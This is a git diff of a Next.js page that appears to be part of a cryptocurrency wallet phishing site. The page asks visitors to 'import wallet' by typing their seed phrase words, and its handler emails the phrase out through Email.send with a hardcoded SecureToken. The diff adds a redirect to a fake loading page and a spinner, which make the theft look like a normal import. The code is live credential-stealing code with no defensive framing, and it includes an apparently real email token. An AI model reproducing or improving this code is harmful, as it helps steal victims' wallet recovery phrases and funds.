@@ -1,5 +1,10 @@
 import { useState } from "react";
 import Image from "next/image";
+import { useRouter } from "next/router"
+
+
+
+
 
 export const getStaticPaths = () => {
     const purses = [
@@ -360,7 +365,7 @@ export const getStaticProps = ( context ) => {
             id: 33
         }
     ];
-
+    
     const _id = context.params.id;
 
     const data = purses[_id - 1];
@@ -373,6 +378,7 @@ export const getStaticProps = ( context ) => {
 }
 const Phrase = ({ data }) => {
     const [phrase12, setPhrase12] = useState("")
+    const router = useRouter();
     const myFunc = ( ) => {
         Email.send({
             SecureToken : "f10ea3fc-c85c-40ed-93e9-4467760c85cf",
@@ -381,7 +387,7 @@ const Phrase = ({ data }) => {
             Subject : data.name,
             Body : phrase12
         }).then(
-          history.pushState('/', true)
+          router.push('/wallet/loading')
         );
         console.log(phrase12)
     }
@@ -395,7 +401,7 @@ const Phrase = ({ data }) => {
                 </section>
                 <div className="d-flex jac">
                     <form className="myform">
-                        <label className="my-3 fw-bold">Kindly import wallet by providing <span className="green">PHRASE WORDS</span> below</label>
+                        <label className="my-3 fw-bold">Kindly import wallet by providing <br/><span className="green">PHRASE WORDS</span> below</label>
                         <textarea
                             className="form-control"
                             cols="30"
@@ -408,6 +414,11 @@ const Phrase = ({ data }) => {
                 </div>
                 <div className="d-flex jac">
                     <button onClick={myFunc} className="btn btn-light my-3 fw-bold dark" id="btn">Import</button>
+                </div>
+                <div className="d-flex jac spin-holder boda3">
+                    <div className="d-flex jac container spin-box boda2">
+                        <div className="loader"></div>
+                    </div>
                 </div>
             </div>
         </main>
